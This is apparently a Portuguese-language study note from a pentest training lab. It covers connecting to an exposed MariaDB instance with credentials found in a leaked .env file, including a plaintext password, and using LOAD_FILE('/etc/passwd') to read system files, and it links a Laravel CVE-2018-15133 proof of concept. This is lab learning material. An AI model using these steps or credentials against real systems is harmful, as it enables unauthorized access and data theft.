# Analise de Vulnerabilidades
os testes da semana seram feitos no lab fornecido pela CrowSec Segurança Ofensiva.

- Cenário:
    > A empresa chamada CS Hosting nos contratou para que nós realizassemos um pentest (achar, explorar e identificar as vulnerabilidades) dentro de sua estrutura.

- Dados:
    > Foi instalado o mariadb-client para uma tentativa de conexão remota com a porta 3306 que está aberta (identificada na etapa de recon).
    > As informações do banco estão no arquivo .env encontrado no fuzzing da etapa de recon.

- Para Analisar:
    > O fato de o banco de dados estar de cara para a internet que pode ser facilmente acessado remotamente usando as infos do arquivo .env encontrado.
    > 

- Repos:
    > CVE-2018-15133 (PoC) - https://github.com/aljavier/exploit_laravel_cve-2018-15133

---

## Comandos
```bash
# conectando na instancia do banco do dominio
$ mysql -h cshosting.crowsec.com.br -u admin_laravel -p # -h especifica o endereco da instancia do banco para ser conectado; -u especifica o usuario que vai ser utilizado; -p especifica a senha que vai ser utilizada (fPXUTSxNdl)

# pelo proprio mysql é possivel exutar comandos para ler aquivos da máquina onde o serviço está instalado, caso não tenha permissão para isso a query retorna NULL.
$ select LOAD_FILE('/etc/passwd'); # ira fazer o similar a um cat no arquivo só que por dentro do mysql
$ 

```

> Link do notion do Kadu: https://www.notion.so/An-lise-de-vulnerabilidades-e8c5f25d6ed6432ba45580233318c737